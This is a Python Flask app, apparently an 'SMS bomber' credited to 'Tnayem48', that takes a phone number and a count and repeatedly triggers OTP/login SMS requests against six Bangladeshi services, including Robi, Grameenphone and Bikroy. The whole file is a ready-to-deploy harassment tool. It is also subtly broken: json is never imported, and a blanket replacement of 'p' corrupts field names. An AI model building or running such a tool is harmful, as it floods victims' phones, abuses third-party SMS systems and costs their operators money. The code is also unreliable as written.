from flask import Flask, request, jsonify
import requests
import time

app = Flask(__name__)

# আপনার দেওয়া JSON API ডাটা
API_LIST = [
    {
        "name": "Robi Wifi",
        "url": "https://robiwifi-mw.robi.com.bd/fwa/api/v1/customer/auth/otp/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "Referer": "https://robiwifi.robi.com.bd/"},
        "data": {"login": "p"}
    },
    {
        "name": "GP Web",
        "url": "https://weblogin.grameenphone.com/backend/api/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": {"msisdn": "p"}
    },
    {
        "name": "Shikho",
        "url": "https://api.shikho.com/auth/v2/send/sms",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "origin": "https://shikho.com", "referer": "https://shikho.com/"},
        "data": {"phone": "880p", "type": "student", "auth_type": "login", "vendor": "shikho"}
    },
    {
        "name": "Chorki",
        "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": {"number": "+880p"}
    },
    {
        "name": "Bikroy",
        "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login",
        "method": "GET",
        "params": {"phone": "p"}
    },
    {
        "name": "Bohubrihi",
        "url": "https://bb-api.bohubrihi.com/public/activity/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": {"phone": "p", "intent": "login"}
    }
]

@app.route('/api')
def handle_api():
    num = request.args.get('num')
    amount = request.args.get('amount', default=1, type=int)

    if not num or len(num) < 10:
        return jsonify({"status": "error", "message": "Valid number is required"}), 400

    if amount > 50: # নিরাপত্তার জন্য লিমিট
        return jsonify({"status": "error", "message": "try again later with a small amount."}), 400

    success_count = 0
    
    # নম্বর ফরম্যাটিং (0 বাদ দিয়ে যদি লাগে)
    clean_num = num[-10:] # ১১ ডিজিটের নম্বর থেকে শেষ ১০ ডিজিট নেয় (১৭xxxx)

    for _ in range(amount):
        for api in API_LIST:
            try:
                # 'p' কে আসল নম্বর দিয়ে রিপ্লেস করা
                payload = None
                if "data" in api:
                    payload = json.loads(json.dumps(api["data"]).replace("p", clean_num if "880p" not in str(api["data"]) else num))
                
                params = None
                if "params" in api:
                    params = json.loads(json.dumps(api["params"]).replace("p", num))

                if api["method"] == "POST":
                    requests.post(api["url"], json=payload, headers=api.get("headers"), timeout=5)
                else:
                    requests.get(api["url"], params=params, timeout=5)
                
                success_count += 1
                time.sleep(0.5) # API গুলোর উপর প্রেশার কমাতে সামান্য বিরতি
            except:
                continue

    return jsonify({
        "status": "success",
        "message": f"successfully sent by Tnayem48. Total requests sent: {success_count}"
    })

# Vercel এর জন্য প্রয়োজন
if __name__ == '__main__':
    app.run()
